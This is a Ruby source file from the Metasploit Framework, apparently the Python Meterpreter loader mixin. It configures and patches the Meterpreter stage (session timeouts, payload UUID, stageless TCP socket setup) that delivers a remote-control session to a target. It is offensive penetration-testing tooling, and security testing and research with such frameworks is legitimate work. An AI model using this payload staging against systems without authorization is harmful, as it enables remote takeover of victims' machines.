# -*- coding: binary -*-

require 'msf/core'
require 'msf/base/sessions/meterpreter_options'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Common module stub for ARCH_PYTHON payloads that make use of Meterpreter.
#
###

module Payload::Python::MeterpreterLoader

  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration',
      'Description'   => 'Run Meterpreter & the configuration stub',
      'Author'        => [ 'Spencer McIntyre' ],
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Stager'        => {'Payload' => ""}
    ))

    register_advanced_options([
      OptBool.new('PythonMeterpreterDebug', [ true, 'Enable debugging for the Python meterpreter', false ])
    ], self.class)
  end

  # Get the raw Python Meterpreter stage and patch in values based on the
  # configuration
  #
  # @param opts [Hash] The options to use for patching the stage data.
  # @option opts [String] :stageless_tcp_socket_setup Python code to execute to
  #   setup a tcp socket to allow use of the stage as a stageless payload.
  # @option opts [String] :uuid A specific UUID to use for sessions created by
  #   this stage.
  def stage_meterpreter(opts={})
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.py')

    if datastore['PythonMeterpreterDebug']
      met = met.sub("DEBUGGING = False", "DEBUGGING = True")
    end

    met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
    met.sub!('SESSION_COMMUNICATION_TIMEOUT = 300', "SESSION_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
    met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{datastore['SessionRetryTotal']}")
    met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{datastore['SessionRetryWait']}")

    uuid = opts[:uuid] || generate_payload_uuid
    uuid = Rex::Text.to_hex(uuid.to_raw, prefix = '')
    met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")

    # patch in any optional stageless tcp socket setup
    unless opts[:stageless_tcp_socket_setup].nil?
      socket_setup = opts[:stageless_tcp_socket_setup]
      socket_setup = socket_setup.split("\n")
      socket_setup.map! {|line| "\t\t#{line}\n"}
      socket_setup = socket_setup.join
      met.sub!("\t\t# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
    end

    met
  end

end

end
